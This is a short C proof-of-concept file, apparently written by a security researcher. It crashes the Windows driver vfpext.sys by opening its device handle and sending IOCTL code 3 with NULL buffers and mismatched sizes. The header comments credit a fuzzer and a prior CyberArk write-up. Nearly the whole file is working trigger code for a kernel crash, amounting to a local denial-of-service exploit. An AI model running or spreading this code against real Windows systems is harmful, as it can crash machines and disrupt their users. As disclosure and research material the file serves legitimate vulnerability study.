#include <windows.h>
#include <stdio.h>

// _SiCk 
// Story time... 
// So I wrote this fuzzer: https://github.com/0xdeadbeefnetwork/ioctl_zap/
// and it found a crash in vfpext.sys.. which is cool.. so i knew the fuzzer worked.. 
// then i'm using google a few days later and i find this... while looking for more education on this type of stuff...
// https://www.cyberark.com/resources/threat-research-blog/finding-bugs-in-windows-drivers-part-1-wdm
// Son of a gun beat me to it. Congrats. Anyway here's the PoC to trigger the bug. :\
// Also thanks to Eran Shimony for his article on 5/24/22 ... 
// If not for him I would have wasted a ton of time with MSRC on this...

#define DEVICE_NAME L"\\\\.\\vfpext"

int main() {
    // Open a handle to the device
    HANDLE hDevice = CreateFile(
        DEVICE_NAME,          // Device name
        GENERIC_READ | GENERIC_WRITE, // Desired access
        0,                    // Share mode
        NULL,                 // Security attributes
        OPEN_ALWAYS,          // Creation disposition
        FILE_ATTRIBUTE_NORMAL,// Flags and attributes
        NULL                  // Template file
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device. Error: %lu\n", GetLastError());
        return 1;
    }

    // Prepare for DeviceIoControl
    DWORD ioctlCode = 3;
    DWORD inBufferSize = 0x512;
    DWORD outBufferSize = 0x512;
    DWORD bytesReturned = 0;
    BOOL result;

    result = DeviceIoControl(
        hDevice,              // Device handle
        ioctlCode,            // IOCTL code
        NULL,                 // Input buffer
        inBufferSize,         // Size of input buffer
        NULL,                 // Output buffer
        outBufferSize,        // Size of output buffer
        &bytesReturned,       // Number of bytes returned
        NULL                  // OVERLAPPED structure
    );

    if (!result) {
        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    printf("DeviceIoControl succeeded. Bytes returned: %lu\n", bytesReturned);

    // Clean up
    CloseHandle(hDevice);
    return 0;
}
